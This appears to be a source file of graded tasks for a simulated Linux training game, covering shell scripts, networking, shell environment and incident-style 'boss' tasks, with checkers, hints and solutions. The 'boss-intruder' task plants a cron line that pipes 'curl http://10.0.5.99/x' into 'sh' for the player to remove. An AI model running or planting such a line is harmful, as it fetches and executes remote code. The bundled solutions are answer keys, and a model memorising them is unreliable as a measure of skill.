/* Practice Range — tasks: shell scripting, networking, your shell, and multi-step boss tasks. */
(function () {
  'use strict';
  const LA = globalThis.LA;
  const P = LA.practice;
  const T = P.task;
  const pack = LA.stories.practice;
  const eqLines = (a, b) => a.length === b.length && a.every((x, i) => x === b[i]);
  /* the player ran a script by path (not just «bash file»), and it printed something */
  const ranScript = (e, re) => !!e.stepEvent('script', (ev) => re.test(ev.path)) || !!e.event('script', (ev) => re.test(ev.path));

  /* ===================== shell scripting ===================== */
  T({
    id: 'sh-hello', topic: 'script', level: 2, cmds: ['bash', 'chmod', 'nano'], title: 'Your first script',
    prompt: 'Write a script «~/hello.sh» that prints «Hello, » followed by your username (use the «$USER» variable). It needs a shebang line. Make it executable and run it as «~/hello.sh».',
    check: (e) => { const t = e.text('~/hello.sh') || ''; return /^#!.*\b(ba)?sh\b/.test(t) && /\$USER|\$\{USER\}/.test(t) && (e.mode('~/hello.sh') & 0o100) !== 0 && ranScript(e, /hello\.sh$/) && e.out().includes('Hello, ' + e.game.user); },
    hints: ['Line 1: «#!/bin/bash». Line 2: «echo "Hello, $USER"».', '«nano ~/hello.sh», save, then «chmod +x ~/hello.sh» and «~/hello.sh».', "Or without an editor: «printf '#!/bin/bash\\necho \"Hello, $USER\"\\n' > ~/hello.sh»"],
    solution: [{ edit: () => '#!/bin/bash\necho "Hello, $USER"\n' }, 'nano ~/hello.sh', 'chmod +x ~/hello.sh', '~/hello.sh'],
  });
  T({
    id: 'sh-args', topic: 'script', level: 2, cmds: ['bash', 'chmod'], title: 'Arguments',
    setup(t) { return { n: t.name(), other: t.pick(['Ada', 'Linus', 'Grace', 'Ken']) + t.int(2, 99) }; },
    prompt: (x) => `Write an executable script «~/greet.sh» that prints «Hi NAME!», where NAME is its first argument — whatever it is. Then run «~/greet.sh ${x.n}».`,
    /* it must work for any name, not just the one shown: try it with another, in a copy of the machine */
    check: async (e, x) => ranScript(e, /greet\.sh$/) && e.out().includes(`Hi ${x.n}!`) && (await e.game.trial(`~/greet.sh ${x.other}`)).out.includes(`Hi ${x.other}!`),
    feedback: (e, x) => (e.file('~/greet.sh') ? `Try it with another name too, say «~/greet.sh ${x.other}» — it should greet whoever you pass in.` : null),
    hints: ['Inside a script, «$1» is the first argument, «$2» the second, «$#» how many.', "«printf '#!/bin/bash\\necho \"Hi $1!\"\\n' > ~/greet.sh && chmod +x ~/greet.sh»"],
    solution: (x) => [{ edit: () => '#!/bin/bash\necho "Hi $1!"\n' }, 'nano ~/greet.sh', 'chmod +x ~/greet.sh', `~/greet.sh ${x.n}`],
  });
  T({
    id: 'sh-for-files', topic: 'script', level: 2, cmds: ['bash', 'touch'], title: 'A loop that makes files',
    setup(t) { return { n: t.int(4, 8), w: t.pick(['report', 'chapter', 'invoice', 'note']) }; },
    prompt: (x) => `Use a «for» loop to create «~/out/${x.w}1.txt» … «~/out/${x.w}${x.n}.txt», each containing the line «${x.w} N» (with its own number).`,
    check: (e, x) => Array.from({ length: x.n }, (_, i) => e.text(`~/out/${x.w}${i + 1}.txt`) === `${x.w} ${i + 1}\n`).every(Boolean) && e.typed(/\bfor\b/),
    hints: [(x) => `«for i in $(seq 1 ${x.n}); do ...; done» — «$i» holds the number.`, (x) => `«mkdir -p ~/out; for i in $(seq 1 ${x.n}); do echo "${x.w} $i" > ~/out/${x.w}$i.txt; done»`],
    solution: (x) => ['mkdir -p ~/out', `for i in $(seq 1 ${x.n}); do echo "${x.w} $i" > ~/out/${x.w}$i.txt; done`],
  });
  T({
    id: 'sh-while-read', topic: 'script', level: 3, cmds: ['bash', 'read', 'mkdir'], title: 'One folder per name',
    setup(t) { const names = t.pickN(['ada', 'alan', 'grace', 'linus', 'ken', 'hedy', 'radia'], 4); t.file('~/team.txt', names); return { names }; },
    prompt: '«~/team.txt» has one name per line. Read it line by line and create a directory «~/users/NAME» for each.',
    check: (e, x) => x.names.every((n) => { const d = e.file('~/users/' + n); return d && d.type === 'dir'; }),
    hints: ['«while read name; do ...; done < FILE» reads a file one line at a time.', '«while read n; do mkdir -p ~/users/$n; done < ~/team.txt»'],
    solution: ['while read n; do mkdir -p ~/users/$n; done < ~/team.txt'],
  });
  T({
    id: 'sh-if', topic: 'script', level: 2, cmds: ['bash', 'test'], title: 'Make a decision',
    setup(t) { const f = '~/' + t.word() + '.lock'; if (t.chance(0.5)) t.file(f, ''); return { f }; },
    prompt: (x) => `In one line, print «locked» if the file «${x.f}» exists, and «free» if it doesn't.`,
    check: (e, x) => { const exists = !!e.file(x.f); const lines = e.out().split('\n').map((l) => l.trim()); return /\[|\btest\b/.test(e.line) && /\bif\b|&&|\|\|/.test(e.line) && lines.includes(exists ? 'locked' : 'free') && !e.out().split('\n').some((l) => l.trim() === (exists ? 'free' : 'locked')); },
    hints: ['«[ -f FILE ]» tests whether a file exists.', (x) => `«if [ -f ${x.f} ]; then echo locked; else echo free; fi»`],
    solution: (x) => [`if [ -f ${x.f} ]; then echo locked; else echo free; fi`],
    why: 'Other tests: -d directory, -e exists, -s non-empty, -r readable, -x executable, -z empty string, -eq/-lt/-gt numbers.',
  });
  T({
    id: 'sh-arith', topic: 'script', level: 1, cmds: ['bash'], title: 'Shell arithmetic',
    setup(t) { const a = t.int(100, 9999), b = t.int(2, 99); return { a, b, want: a * b }; },
    prompt: (x) => `What is ${x.a} × ${x.b}? Make the shell work it out with «$(( ))».`,
    check: (e, x) => /\$\(\(/.test(e.line) && e.out().split('\n').some((l) => l.trim() === String(x.want)),
    hints: [(x) => `«echo $(( ${x.a} * ${x.b} ))»`],
    solution: (x) => [`echo $(( ${x.a} * ${x.b} ))`],
    why: '«$(( ))» is integer-only: «$(( 7 / 2 ))» is 3. For decimals use «bc».',
  });
  T({
    id: 'sh-bc', topic: 'script', level: 2, cmds: ['bc'], title: 'Decimals',
    setup(t) { const a = t.int(10, 99), b = t.int(3, 9); return { a, b, want: (Math.trunc((a / b) * 1000) / 1000).toFixed(3) }; },
    prompt: (x) => `What is ${x.a} ÷ ${x.b}, to 3 decimal places? Use a calculator command.`,
    check: (e, x) => e.used('bc') && e.out().split('\n').some((l) => l.trim().replace(/^\./, '0.') === x.want),
    hints: [(x) => `«echo "scale=3; ${x.a} / ${x.b}" | bc»`],
    solution: (x) => [`echo "scale=3; ${x.a} / ${x.b}" | bc`],
  });
  T({
    id: 'sh-seq', topic: 'script', level: 1, cmds: ['seq'], title: 'Count by twos',
    setup(t) { const end = t.pick([10, 16, 20, 30]); return { end, want: Array.from({ length: end / 2 }, (_, i) => String((i + 1) * 2)) }; },
    prompt: (x) => `Print the even numbers from 2 to ${x.end}, one per line.`,
    check: (e, x) => eqLines(e.shownLines(), x.want),
    hints: ['«seq FIRST STEP LAST».'],
    solution: (x) => [`seq 2 2 ${x.end}`],
  });
  T({
    id: 'sh-printf', topic: 'script', level: 2, cmds: ['printf'], title: 'A tidy table',
    setup(t) { const rows = t.pickN(['apples', 'kiwis', 'plums', 'figs'], 3).map((n) => [n, t.int(1, 99)]); return { rows }; },
    prompt: (x) => `Print a two-column table with «printf»: the names left-aligned in a column 10 characters wide, then the numbers. Rows: ${x.rows.map((r) => `«${r[0]} ${r[1]}»`).join(', ')}.`,
    check: (e, x) => e.used('printf') && x.rows.every((r) => { const l = e.shownLines({ any: true }); return l.includes(r[0].padEnd(10) + r[1]) || l.includes(r[0].padEnd(10) + ' ' + r[1]); }),
    hints: ["«%-10s» is a left-aligned, 10-wide string; the format repeats for every pair of arguments.", (x) => `«printf '%-10s%s\\n' ${x.rows.map((r) => r.join(' ')).join(' ')}»`],
    solution: (x) => [`printf '%-10s%s\\n' ${x.rows.map((r) => r.join(' ')).join(' ')}`],
  });
  T({
    id: 'sh-exitcode', topic: 'script', level: 2, cmds: ['grep'], title: 'Did it work?',
    setup(t) { t.file('~/names.txt', t.pickN(['ada', 'alan', 'grace', 'linus'], 3)); },
    prompt: 'Search «~/names.txt» for «zelda» (it isn\'t there), then print the exit status of that search.',
    check: (e) => /\$\?/.test(e.line) && e.attempted('grep') && e.out().split('\n').some((l) => l.trim() === '1'),
    hints: ['«$?» holds the exit status of the last command: 0 success, 1 no match for grep, 2 an error.', '«grep zelda ~/names.txt; echo $?»'],
    solution: ['grep zelda ~/names.txt; echo $?'],
  });
  T({
    id: 'sh-var-subst', topic: 'script', level: 2, cmds: ['wc'], title: 'Store a result',
    prompt: 'Store the number of accounts in «/etc/passwd» (its line count) in a variable called «COUNT», then print «Users: N» using that variable.',
    check: (e) => { const n = e.fs.contentOf(e.fs.get('/etc/passwd')).split('\n').filter(Boolean).length; const v = e.shell.vars.get('COUNT'); return !!v && String(v.v).trim() === String(n) && e.out().split('\n').some((l) => l.trim() === `Users: ${n}`); },
    hints: ['«COUNT=$(wc -l < /etc/passwd)» — no spaces around «=».', '«echo "Users: $COUNT"»'],
    solution: ['COUNT=$(wc -l < /etc/passwd)', 'echo "Users: $COUNT"'],
  });
  T({
    id: 'sh-read-script', topic: 'script', level: 3, cmds: ['read', 'bash'], title: 'Ask the user',
    setup(t) { return { n: t.name(), other: t.pick(['Hedy', 'Alan', 'Radia']) }; },
    prompt: (x) => `Write an executable script «~/ask.sh» that asks «Name? » with «read», then prints «Welcome, NAME». Run it and answer «${x.n}».`,
    check: async (e, x) => ranScript(e, /ask\.sh$/) && e.out().includes(`Welcome, ${x.n}`) && (await e.game.trial('~/ask.sh', { stdin: [x.other] })).out.includes(`Welcome, ${x.other}`),
    hints: ['«read -p "Name? " name» waits for a line and stores it in «$name».', "«printf '#!/bin/bash\\nread -p \"Name? \" name\\necho \"Welcome, $name\"\\n' > ~/ask.sh && chmod +x ~/ask.sh»"],
    solution: (x) => [{ edit: () => '#!/bin/bash\nread -p "Name? " name\necho "Welcome, $name"\n' }, 'nano ~/ask.sh', 'chmod +x ~/ask.sh', { nowait: '~/ask.sh' }, { answer: x.n }],
  });
  T({
    id: 'sh-expr', topic: 'script', level: 1, cmds: ['expr'], title: 'The remainder',
    setup(t) { const a = t.int(20, 200), b = t.int(3, 9); return { a, b, want: a % b }; },
    prompt: (x) => `What is the remainder when ${x.a} is divided by ${x.b}? Use «expr» (or «$(( ))»).`,
    check: (e, x) => (e.attempted('expr') || /\$\(\(/.test(e.line)) && e.out().split('\n').some((l) => l.trim() === String(x.want)),
    hints: [(x) => `«expr ${x.a} % ${x.b}» — or «echo $(( ${x.a} % ${x.b} ))».`],
    solution: (x) => [`expr ${x.a} % ${x.b}`],
  });
  T({
    id: 'sh-dated-loop', topic: 'script', level: 3, cmds: ['bash', 'cp', 'date'], title: 'Back up every config',
    setup(t) { const files = t.pickN(['app.conf', 'db.conf', 'cache.conf', 'mail.conf', 'web.conf'], 3); for (const f of files) t.file('~/etc/' + f, `${f}=1\n`); return { files, d: LA.util.strftime('%F', new Date(LA.now())) }; },
    prompt: (x) => `For every «.conf» file in «~/etc», make a copy next to it named «FILE.${x.d}.bak» (today\'s date). Use a loop and «$(date +%F)».`,
    check: (e, x) => x.files.every((f) => e.text(`~/etc/${f}.${x.d}.bak`) === `${f}=1\n`),
    hints: ['«for f in ~/etc/*.conf; do cp "$f" "$f.$(date +%F).bak"; done»'],
    solution: ['for f in ~/etc/*.conf; do cp "$f" "$f.$(date +%F).bak"; done'],
  });

  /* ===================== networking ===================== */
  T({
    id: 'net-ip', topic: 'net', level: 1, cmds: ['ip'], title: 'My address',
    prompt: 'What is this machine\'s IP address on its network interface? Show the interfaces and their addresses.',
    check: (e) => !!e.ran('ip', (r) => /10\.0\.5\.2\//.test(r.out)),
    hints: ['«ip a» (short for «ip address»).'],
    solution: ['ip a'],
  });
  T({
    id: 'net-route', topic: 'net', level: 1, cmds: ['ip'], title: 'The way out',
    prompt: 'Which machine is this one\'s default gateway? Show the routing table.',
    check: (e) => !!e.ran('ip', (r) => /default via/.test(r.out)),
    hints: ['«ip r» (short for «ip route»).'],
    solution: ['ip r'],
  });
  T({
    id: 'net-ping', topic: 'net', level: 1, cmds: ['ping'], title: 'Are you there?',
    setup(t) { return { h: t.pick(['backup.lab', 'web.lab', 'gateway']) }; },
    prompt: (x) => `Check that «${x.h}» is reachable: send it exactly 3 pings.`,
    check: (e, x) => !!e.ran('ping', (r) => r.args.includes(x.h) && /3 packets transmitted/.test(r.out)),
    hints: ['«ping -c 3 HOST» — without «-c» it pings forever.'],
    solution: (x) => [`ping -c 3 ${x.h}`],
  });
  T({
    id: 'net-dns', topic: 'net', level: 1, cmds: ['dig', 'host'], title: 'What\'s its address?',
    setup(t) { const h = t.pick([['web.lab', '10.0.5.10'], ['backup.lab', '10.0.5.20']]); return { h: h[0], ip: h[1] }; },
    prompt: (x) => `What IP address does «${x.h}» resolve to? Ask DNS.`,
    check: (e, x) => e.answer(x.ip),
    hints: ['«dig +short NAME» or «host NAME».'],
    solution: (x) => [`dig +short ${x.h}`],
  });
  T({
    id: 'net-curl', topic: 'net', level: 2, cmds: ['curl'], title: 'Ask the web server',
    setup(t) { const v = `${t.int(1, 4)}.${t.int(0, 20)}.${t.int(0, 9)}`; t.http('/status', `{"service":"web","version":"${v}","healthy":true}\n`, 'application/json'); return { v }; },
    prompt: 'Fetch «http://web.lab/status» and read the version it reports.',
    check: (e, x) => !!e.ran('curl') && e.out().includes(x.v),
    hints: ['«curl URL» prints the response.'],
    solution: ['curl http://web.lab/status'],
  });
  T({
    id: 'net-curl-head', topic: 'net', level: 2, cmds: ['curl'], title: 'Just the headers',
    setup(t) { t.http('/new-page', 'hello\n'); },
    prompt: 'What HTTP status code does «http://web.lab/old-page» return? Fetch only the response headers.',
    check: (e) => !!e.tried('curl', (r) => e.has(r, 'I') && /404/.test(r.out)),
    hints: ['«curl -I URL» asks for the headers only.'],
    solution: ['curl -I http://web.lab/old-page'],
  });
  T({
    id: 'net-download', topic: 'net', level: 1, cmds: ['wget', 'curl'], title: 'Download a file',
    setup(t) { const rows = Array.from({ length: t.int(5, 15) }, () => `${t.int(1, 99)},${t.word()}`); t.http('/files/data.csv', 'id,name\n' + rows.join('\n') + '\n', 'text/csv'); return { body: 'id,name\n' + rows.join('\n') + '\n' }; },
    prompt: 'Download «http://web.lab/files/data.csv» into your home directory as «data.csv».',
    check: (e, x) => e.text('~/data.csv') === x.body,
    hints: ['«wget URL» saves into the current directory; «curl -o FILE URL» saves where you say.'],
    solution: ['cd ~', 'wget http://web.lab/files/data.csv'],
  });
  T({
    id: 'net-ss', topic: 'net', level: 2, cmds: ['ss', 'sudo'], title: 'What\'s listening?',
    prompt: 'Which TCP ports is this machine listening on, and which programs own them? (Seeing the program names needs root.)',
    check: (e) => !!e.ran('ss', (r) => /LISTEN/.test(r.out) && /nginx/.test(r.out)),
    hints: ['«sudo ss -tlnp»: TCP, listening, numeric, processes.'],
    solution: ['sudo ss -tlnp', '$PW'],
  });
  T({
    id: 'net-ssh', topic: 'net', level: 2, cmds: ['ssh'], title: 'Log in elsewhere',
    setup(t) { return { f: `hello-from-${t.word()}.txt`, fp: LA.hostFingerprint('10.0.5.20') }; },
    prompt: (x) => `Log in to «backup.lab» over SSH — checking its host key against «~/lab-hostkeys.txt» before you trust it — create the file «~/${x.f}» *there*, then come back to this machine.`,
    check: (e, x) => !!e.world.hosts.backup.fs.tryGet(`/home/${e.game.user}/${x.f}`) && e.host === 'range',
    nudge: (e, x) => (e.host === 'backup' && e.world.hosts.backup.fs.tryGet(`/home/${e.game.user}/${x.f}`) ? 'Done on backup.lab — now «exit» to come back.' : null),
    hints: ['The first time you connect, ssh shows the host\'s key fingerprint. Compare it with the one ops published in «~/lab-hostkeys.txt».', 'At the question you can type «yes» — or paste the expected fingerprint itself, and ssh compares it for you.', '«ssh backup.lab», check the key, «touch ~/FILE», «exit».'],
    solution: (x) => ['cat ~/lab-hostkeys.txt', 'ssh backup.lab', { answer: x.fp }, `touch ~/${x.f}`, 'exit'],
    why: 'That question is the only thing standing between you and a machine pretending to be the server. If a known host\'s key ever changes, ssh refuses — find out why before you «ssh-keygen -R» it.',
  });
  T({
    id: 'net-scp-up', topic: 'net', level: 2, cmds: ['scp'], title: 'Send a file',
    setup(t) { t.file('~/report.pdf', '', { format: 'pdf', data: { pages: 3 } }); },
    prompt: 'Copy «~/report.pdf» to «/srv/backups/» on «backup.lab».',
    check: (e) => !!e.world.hosts.backup.fs.tryGet('/srv/backups/report.pdf'),
    hints: ['«scp FILE HOST:PATH».', 'A first connection asks you to trust the host: compare its fingerprint with «~/lab-hostkeys.txt».'],
    solution: ['scp ~/report.pdf backup.lab:/srv/backups/', { answer: LA.hostFingerprint('10.0.5.20') }],
  });
  T({
    id: 'net-scp-down', topic: 'net', level: 2, cmds: ['scp'], title: 'Fetch a file',
    setup(t) { const body = `-- dump ${t.int(1000, 9999)}\n`; t.remote('backup', '/srv/backups/db.sql', body); return { body }; },
    prompt: 'Copy «/srv/backups/db.sql» from «backup.lab» into your home directory here.',
    check: (e, x) => e.text('~/db.sql') === x.body,
    hints: ['«scp HOST:PATH LOCAL» — the remote side goes first this time.', 'A first connection asks you to trust the host: compare its fingerprint with «~/lab-hostkeys.txt».'],
    solution: ['scp backup.lab:/srv/backups/db.sql ~/', { answer: LA.hostFingerprint('10.0.5.20') }],
  });
  T({
    id: 'net-unreachable', topic: 'net', level: 2, cmds: ['ping'], title: 'Which one is down?',
    prompt: 'One of «10.0.5.10», «10.0.5.20» and «10.0.5.99» isn\'t answering. Ping them (2 packets each) and find out which.',
    check: (e) => ['10.0.5.10', '10.0.5.20', '10.0.5.99'].every((ip) => e.attempted('ping', (r) => r.args.includes(ip))),
    hints: ['«ping -c 2 ADDRESS» for each; «Destination Host Unreachable» or 100% packet loss means no answer.'],
    solution: ['ping -c 2 10.0.5.10', 'ping -c 2 10.0.5.20', 'ping -c 2 10.0.5.99'],
  });

  /* ===================== your shell ===================== */
  T({
    id: 'env-export', topic: 'shell', level: 1, cmds: ['export', 'printenv'], title: 'An environment variable',
    setup(t) { return { v: t.pick(['staging', 'production', 'dev']) }; },
    prompt: (x) => `Set an environment variable «APP_ENV» to «${x.v}» so that programs you start can see it, then print it with «printenv».`,
    check: (e, x) => { const v = e.shell.vars.get('APP_ENV'); return !!v && v.v === x.v && !!v.x && e.used('printenv'); },
    hints: [(x) => `«export APP_ENV=${x.v}», then «printenv APP_ENV».`],
    solution: (x) => [`export APP_ENV=${x.v}`, 'printenv APP_ENV'],
  });
  T({
    id: 'env-unset', topic: 'shell', level: 1, cmds: ['unset'], title: 'Forget a variable',
    setup(t) { t.game.console.main.setVar('DEBUG_TOKEN', 'abc123', true); },
    prompt: 'Your shell has a variable «DEBUG_TOKEN» set that shouldn\'t be there. Remove it.',
    check: (e) => !e.shell.vars.has('DEBUG_TOKEN'),
    hints: ['«unset NAME».'],
    solution: ['unset DEBUG_TOKEN'],
  });
  T({
    id: 'env-grep', topic: 'shell', level: 1, cmds: ['env', 'grep'], title: 'Which variables mention HOME?',
    prompt: 'Show only the environment variables whose line contains «HOME».',
    check: (e) => e.used('env') && e.shownLines().length > 0 && e.shownLines().every((l) => l.includes('HOME')),
    hints: ['«env | grep HOME».'],
    solution: ['env | grep HOME'],
  });
  T({
    id: 'alias-ll', topic: 'shell', level: 1, cmds: ['alias'], title: 'A shortcut',
    prompt: 'Create an alias «ll» that runs «ls -la», then use it.',
    check: (e) => /ls\s+-(la|al)/.test(e.shell.aliases.ll || '') && /^\s*ll\b/.test(e.line) && !!e.ran('ls'),
    hints: ["«alias ll='ls -la'», then «ll»."],
    solution: ["alias ll='ls -la'", 'll'],
  });
  T({
    id: 'alias-persist', topic: 'shell', level: 2, cmds: ['source', 'echo', 'alias'], title: 'Keep it for next time',
    prompt: 'Make an alias «la» for «ls -A» that every new shell on this machine will have: add it to «~/.bashrc», then load the file into this shell and use «la».',
    check: (e) => /^\s*alias la=['"]?ls -A['"]?\s*$/m.test(e.text('~/.bashrc') || '') && /^ls -A$/.test(e.shell.aliases.la || '') && /^\s*la\b/.test(e.line) && !!e.ran('ls'),
    hints: ['A line «alias NAME=\'COMMAND\'» in ~/.bashrc runs in every new interactive shell.', `«echo "alias la='ls -A'" >> ~/.bashrc», then «source ~/.bashrc», then «la».`],
    solution: [`echo "alias la='ls -A'" >> ~/.bashrc`, 'source ~/.bashrc', 'la'],
    why: '«>>» appends; a single «>» here would wipe your whole .bashrc. (These practice machines are rebuilt for each task, so the alias won\'t follow you to the next one.)',
  });
  T({
    id: 'alias-unalias', topic: 'shell', level: 1, cmds: ['unalias', 'type'], title: 'Get rid of an alias',
    setup(t) { t.game.console.main.aliases.rm = 'rm -i'; },
    prompt: '«rm» keeps asking for confirmation because it\'s aliased. Confirm that with «type», then remove the alias for this shell.',
    check: (e) => e.used('type') && !e.shell.aliases.rm,
    hints: ['«type rm», then «unalias rm».'],
    solution: ['type rm', 'unalias rm'],
  });
  T({
    id: 'path-bin', topic: 'shell', level: 3, cmds: ['export'], title: 'Your own commands',
    setup(t) { const w = t.word(); t.file('~/bin/' + w, `#!/bin/bash\necho "${w} works"\n`, { mode: 0o755 }); return { w }; },
    prompt: (x) => `«~/bin/${x.w}» is a script. Make it runnable by typing just «${x.w}» — from anywhere — by adding «~/bin» to the front of your «PATH». Then run it.`,
    check: (e, x) => new RegExp(`^\\s*${x.w}\\b`).test(e.line) && e.out().includes(`${x.w} works`),
    hints: ['«export PATH="$HOME/bin:$PATH"».'],
    solution: (x) => ['export PATH="$HOME/bin:$PATH"', x.w],
  });
  T({
    id: 'hist', topic: 'shell', level: 1, cmds: ['history'], title: 'What did I type?',
    prompt: 'Show your last 5 commands.',
    check: (e) => !!e.ran('history', (r) => r.args.includes('5')) || (e.pipe && !!e.ran('history') && !!e.ran('tail')),
    hints: ['«history 5».'],
    solution: ['history 5'],
    why: '«!!» repeats the last command, «!42» command 42, and Ctrl+R searches your history as you type.',
  });
  T({
    id: 'echo-vars', topic: 'shell', level: 1, cmds: ['echo'], title: 'Where am I, who am I?',
    prompt: 'In one «echo», print your home directory and your username using the «HOME» and «USER» variables.',
    check: (e) => !!e.ran('echo') && /\$(HOME|\{HOME\})/.test(e.line) && /\$(USER|\{USER\})/.test(e.line) && e.out().includes(e.game.home) && e.out().includes(e.game.user),
    hints: ['«echo "$HOME $USER"».'],
    solution: ['echo "$HOME $USER"'],
  });

  /* ===================== boss tasks ===================== */
  T({
    id: 'boss-incident', topic: 'procs', level: 4, cmds: ['df', 'du', 'gzip', 'systemctl'], title: 'Boss: the disk is filling up',
    setup(t) {
      const svc = t.pick(['metrics', 'nginx']);
      const big = `/var/log/${svc}/${t.pick(['debug', 'trace'])}.log`;
      t.file(big, Array.from({ length: 200 }, (_, i) => `debug ${i}`), { size: 6 * 1073741824 });
      t.file('/var/log/syslog.1', 'x\n', { size: 2 * 1048576 });
      /* a 20 GB root disk, 97% full because of that log */
      t.world.sys.rootSizeKb = 20 * 1048576;
      t.world.sys.rootUsedKb = Math.round(20 * 1048576 * 0.97) - 6 * 1048576;
      t.world.sys.grows = ['/var/log'];
      return { big, svc };
    },
    prompt: 'The root disk is 97% full, and one log under «/var/log» is to blame. Fix it:',
    parts: [
      { text: 'find the biggest file under /var/log (show it on screen)', check: (e, x) => e.out().includes(LA.VFS.basename(x.big)) && e.used(['du', 'find', 'ls']) },
      { text: 'compress that file with gzip (replacing it)', state: true, check: (e, x) => !!e.file(x.big + '.gz') && !e.file(x.big) },
      { text: 'restart the service that writes it (its name is in the path)', check: (e, x) => !!e.ran('systemctl', (r) => r.args.includes('restart') && r.args.some((a) => a.replace(/\.service$/, '') === x.svc)) },
      /* and prove it worked */
      { text: 'show with «df» that the root disk has room again', check: (e) => !!e.ran('df', (r) => /\/\s*$/m.test(r.out) && /\b([0-8]?\d)%\s+\/\s*$/m.test(r.out)) },
    ],
    hints: ['«df -h /» shows how full the root disk is; «du -ah /var/log | sort -h | tail» shows the biggest things in /var/log.', 'Logs belong to root: «sudo gzip FILE» compresses it in place.', 'The service is the folder name; restart it with systemctl so it opens a fresh log. Then «df -h /» again.'],
    solution: (x) => ['df -h /', 'sudo du -ah /var/log | sort -h | tail -n 3', '$PW', `sudo gzip ${x.big}`, `sudo systemctl restart ${x.svc}`, 'df -h /'],
    why: 'A process that still has a deleted log open keeps its space in use — restarting it (or «logrotate») lets the disk actually get it back.',
  });
  T({
    id: 'boss-deploy', topic: 'files', level: 4, cmds: ['tar', 'ln', 'chmod', 'mkdir'], title: 'Boss: ship a release',
    setup(t) { const v = `2.${t.int(0, 9)}.${t.int(0, 9)}`; const tag = t.word(); const entries = [{ path: 'run.sh', type: 'file', mode: 0o644, content: `#!/bin/bash\necho "running ${tag} ${v}"\n` }, { path: 'lib/app.py', type: 'file', mode: 0o644, content: `# app ${v}\n` }]; t.file(`~/release-${v}.tar.gz`, '', { format: 'gzip', data: { name: 'r.tar', inner: { format: 'tar', data: { entries } } } }); return { v, tag, files: { 'run.sh': entries[0].content, 'lib/app.py': entries[1].content } }; },
    prompt: (x) => `Deploy «~/release-${x.v}.tar.gz» — at the end, «~/current/run.sh» must run the new release:`,
    parts: [
      { text: (x) => `unpack it into «~/releases/${x.v}»`, state: true, check: (e, x) => P.h.hasTree(e, `~/releases/${x.v}`, x.files) },
      { text: (x) => `make «~/releases/${x.v}/run.sh» executable`, state: true, check: (e, x) => (e.mode(`~/releases/${x.v}/run.sh`) & 0o100) !== 0 },
      { text: (x) => `point a symlink «~/current» at «~/releases/${x.v}»`, state: true, check: (e, x) => { const n = e.file('~/current'); return !!n && n.type === 'link' && LA.VFS.normalize(n.target, e.home) === e.p(`~/releases/${x.v}`) && !!e.follow('~/current/run.sh'); } },
    ],
    /* and the whole thing works: run it, in a copy of the machine */
    check: async (e, x) => (await e.game.trial('~/current/run.sh')).out.includes(`running ${x.tag} ${x.v}`),
    hints: ['Make the directory first; «tar -C DIR» unpacks into it.', '«chmod +x» for the script; «ln -s TARGET LINKNAME» for the link — target first.', 'Finish by running «~/current/run.sh» yourself.'],
    solution: (x) => [`mkdir -p ~/releases/${x.v}`, `tar -xzf ~/release-${x.v}.tar.gz -C ~/releases/${x.v}`, `chmod +x ~/releases/${x.v}/run.sh`, `ln -s ~/releases/${x.v} ~/current`, '~/current/run.sh'],
    why: 'Switching a «current» symlink is how many deploys work: the new release is unpacked beside the old one, and one quick «ln -sfn» flips over — or back.',
  });
  T({
    id: 'boss-intruder', topic: 'perms', level: 4, cmds: ['grep', 'crontab', 'pkill', 'userdel'], title: 'Boss: an uninvited account',
    setup(t) { const who = t.pick(['svc-update', 'sysadm1n', 'backup2']); t.account(who, { groups: [LA.distro(t.world).admin] }); t.cron(who, `*/5 * * * * curl -s http://10.0.5.99/x | sh\n`); t.proc({ user: who, comm: 'sh', args: `sh -c curl 10.0.5.99`, tty: '?' }); return { who }; },
    prompt: 'Somebody created an account you didn\'t, and gave it sudo. Deal with it:',
    parts: [
      { text: 'find the extra member of the admins\' group, «{admin}» (show the group line)', check: (e, x) => e.out().includes(x.who) && e.used(['grep', 'getent', 'cat', 'groups']) },
      { text: 'remove its crontab', state: true, check: (e, x) => !e.file(LA.cronSpool(e.world) + '/' + x.who) },
      { text: 'stop its processes', state: true, check: (e, x) => !e.world.procs.some((p) => p.user === x.who) },
      { text: 'delete the account and its home', state: true, check: (e, x) => !e.world.main.users.exists(x.who) && !e.file('/home/' + x.who) },
    ],
    hints: ['The admins\' group line in «/etc/group» lists its members after the last colon.', 'Root can manage anyone\'s crontab with «crontab -u USER», stop a user\'s processes with «pkill -u USER», and delete an account with its home using «userdel -r».', 'Stop the processes before deleting the account — userdel refuses while the user is still running things.'],
    solution: (x) => ["grep '^{admin}:' /etc/group", `sudo crontab -r -u ${x.who}`, '$PW', `sudo pkill -u ${x.who}`, `sudo userdel -r ${x.who}`],
  });
})();
